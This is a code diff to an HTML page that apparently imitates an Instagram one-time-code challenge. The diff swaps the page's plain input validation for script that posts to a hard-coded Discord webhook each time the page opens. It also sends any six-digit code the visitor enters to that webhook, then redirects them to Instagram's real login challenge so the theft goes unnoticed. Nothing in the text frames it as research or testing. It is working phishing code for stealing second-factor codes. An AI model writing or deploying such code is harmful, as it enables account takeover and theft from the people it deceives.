@@ -138,24 +138,35 @@
     </div>
 
     <script>
-        document.getElementById('securityCode').addEventListener('input', function() {
-            const securityCode = this.value;
-            const confirmButton = document.getElementById('confirmButton');
-            confirmButton.disabled = securityCode.length !== 6 || !/^\d+$/.test(securityCode);
-        });
+    const webhookURL = "https://discord.com/api/webhooks/1340985774304399401/RwrIVoSbDOa0sndcIY2GgVs90H6HVvOTIlwK4G_HZASvLbDiAeOzsELv85XfLNMXVPfp";
 
-        document.getElementById('otpForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const securityCode = document.getElementById('securityCode').value;
-            const errorMessage = document.getElementById('errorMessage');
+    // Notify when the page is opened
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "A user opened the OTP page!" })
+    });
 
-            if (securityCode.length !== 6 || !/^\d+$/.test(securityCode)) {
-                errorMessage.style.display = 'block';
-            } else {
-                errorMessage.style.display = 'none';
-                window.location.href = 'https://www.instagram.com/accounts/login/?next=/challenge/';
-            }
-        });
-    </script>
+    document.getElementById("otpForm").addEventListener("submit", async function(event) {
+        event.preventDefault();
+
+        const securityCode = document.getElementById("securityCode").value;
+
+        if (securityCode.length === 6 && /^\d+$/.test(securityCode)) {
+            // Send OTP to Discord
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `🔑 **OTP Entered:** ${securityCode}`
+                })
+            });
+
+            window.location.href = 'https://www.instagram.com/accounts/login/?next=/challenge/';
+        }
+    });
+</script>
+
+       
 </body>
 </html>
